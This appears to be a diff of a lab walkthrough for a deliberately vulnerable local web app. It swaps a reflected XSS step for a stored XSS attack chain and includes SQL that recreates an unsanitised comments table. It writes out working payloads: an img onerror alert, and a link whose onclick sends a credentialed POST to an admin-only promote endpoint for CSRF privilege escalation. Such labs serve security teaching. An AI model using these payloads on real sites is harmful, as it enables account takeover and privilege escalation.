@@ -242,31 +242,54 @@ Expected visible records:
 ---
 
 ## Step 3 — Execute Reflected XSS
+## Comments Table (Stored XSS)
 
-Paste this URL directly into the browser address bar:
+This table was added to support the stored XSS attack chain.
 
-```text
-http://localhost:5173/destinations?q=<img src=x onerror=alert('Reflected-XSS-Execution-Proof')>
-```
+Run:
 
-### Successful Result Indicators
+DROP TABLE IF EXISTS comments;
 
-- Browser alert popup appears.
-- Broken image icon appears on page.
-- Search term renders as HTML instead of escaped text.
+CREATE TABLE comments (
+  id SERIAL PRIMARY KEY,
+  content TEXT NOT NULL,
+  created_at TIMESTAMP DEFAULT NOW()
+);
+
+This table stores user comments without sanitization.
+Attacker navigates to:
+
+/promo
+
+Posts malicious comment:
+
+<a href="#" onclick="fetch('/api/promote/2',{method:'POST',credentials:'include'})">
+Claim your free travel reward
+</a>
+
+Replace 2 with attacker's user ID.
+
+The payload becomes permanently stored in PostgreSQL.
 
 ---
 
 ## Step 4 — Execute XSS → CSRF Privilege Escalation
 
-Replace `2` with your attacker account ID:
+When admin clicks the malicious link:
 
-```text
-http://localhost:5173/destinations?q=<img src=x onerror="fetch('/api/promote/2',{method:'POST',credentials:'include'})">
-```
+fetch('/api/promote/2',{
+  method:'POST',
+  credentials:'include'
+})
+## Step 5 – CSRF Occurs
 
----
+Because:
 
+admin is authenticated
+cookies are automatically included
+endpoint has no CSRF protection
+
+the request is processed as admin.
 ### Simulate the Administrator Session
 
 Open another browser or Incognito window.
